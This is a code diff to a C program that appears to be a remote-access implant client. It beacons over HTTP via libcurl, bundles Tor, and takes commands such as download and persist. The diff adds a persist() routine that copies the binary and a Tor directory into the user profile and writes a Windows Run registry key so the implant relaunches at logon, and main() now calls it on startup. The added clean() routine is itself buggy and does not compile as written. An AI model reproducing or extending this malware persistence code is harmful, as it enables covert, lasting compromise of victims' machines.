@@ -3,10 +3,12 @@
 #include <string.h>
 #include <stdbool.h>
 #include <time.h>
-#include <sys/time.h>
 #include <curl/curl.h>
 #include <unistd.h>
 #include <pthread.h>
+#include <sys/time.h>
+#include <sys/types.h>
+#include <sys/stat.h>
 
 #define BUFFER_SIZE 256
 
@@ -33,6 +35,22 @@ long TIME_LAST_ACTIVE;
 /* ----------------------------------------------------------------------- *
 *  Utility
 * ------------------------------------------------------------------------ */
+void copy(char *source, char *dest)
+{
+    FILE* fsource = fopen(source, "rb");
+    FILE* fdest = fopen(dest, "wb");
+    size_t n, m;
+    unsigned char buff[8192];
+    do {
+        n = fread(buff, 1, sizeof buff, fsource);
+        if(n) m = fwrite(buff, 1, n, fdest);
+        else m = 0;
+    } while((n > 0) && (n == m));
+    if(m) perror("copy");
+    fclose(fsource);
+    fclose(fdest);
+}
+
 char* fileToString(char* file_name)
 {
     FILE *file = fopen(file_name, "r");
@@ -367,6 +385,58 @@ char* say_hello()
     return post_request(path, post_data, json);
 }
 
+void persist()
+{
+#if _WIN32
+    char *persist_dir = malloc(BUFFER_SIZE);
+    char *user_dir = getenv("USERPROFILE");
+    char *apic = "\\apic";
+    sprintf(persist_dir,"%s%s",user_dir,apic);
+    struct stat st = {0};
+    if(stat(persist_dir, &st) == -1)
+    {
+        mkdir(persist_dir, 0755);
+    }
+    else
+    {
+        //pthread_exit(NULL);
+        return;
+    }
+    char *command = malloc(BUFFER_SIZE);
+    sprintf(command, "cp .\\apic %s\\apic", persist_dir);
+    system(command);
+    sprintf(command, "cp -r .\\tor %s\\tor", persist_dir);
+    system(command);
+    sprintf(command, "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /f /v apic /t REG_SZ /d \"%s\\apic\\apic.exe\"", persist_dir);
+    system(command);
+    //sprintf(command, "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /f /v tor /t REG_SZ /d \"%s\\tor\\tor\\tor.exe\"", persist_dir);
+    //system(command);
+    printf("Installed!");
+    printf("\n");
+    send_output("[+] Installed",true);
+#elif __LINUX__
+    //TODO
+#endif
+    //pthread_exit(NULL);
+    return;
+}
+
+void clean()
+{
+#if _WIN32
+    sprintf(command, "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /f /v apic");
+    system(command);
+    //sprintf(command, "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /f /v tor");
+    //system(command);
+    printf("Removed!");
+    printf("\n");
+    send_output("[+] Removed",true);
+#elif __LINUX__
+    //TODO
+#endif
+    return;
+}
+
 void* download(void* input)
 {
     char *arg1, *arg2;
@@ -509,24 +579,16 @@ void run()
                 else
                     pthread_create(&tid, NULL, download, get_args(todo));
             }
+            else if(strcmp("persist",command) == 0)
+            {
+                //pthread_create(&tid, NULL, persist, NULL);
+            }
 /*
             else if(strcmp("clean",command) == 0)
             {
 
             }
-            else if(strcmp("persist",command) == 0)
-            {
-
-            }
             else if(strcmp("exit",command) == 0)
-            {
-
-            }
-            else if(strcmp("zip",command) == 0)
-            {
-
-            }
-            else if(strcmp("screenshot",command) == 0)
             {
 
             }
@@ -548,6 +610,8 @@ void run()
 int main()
 {
     setup();
-    run();
+    persist();
+
+    //run();
     return 0;
 }
